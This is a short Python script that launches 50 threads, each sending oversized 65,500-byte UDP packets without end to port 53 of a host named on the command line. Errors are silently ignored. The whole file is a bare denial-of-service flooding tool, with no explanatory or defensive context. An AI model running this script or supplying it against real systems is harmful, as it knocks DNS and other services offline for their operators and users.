import threading, socket, random, sys

def a():
  while True:
      try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        host = str(sys.argv[1])
        s.sendto(bytes(65500), (host, 53))
      except:
        pass
for i in range(0, 50):
    threading.Thread(target=a).start()
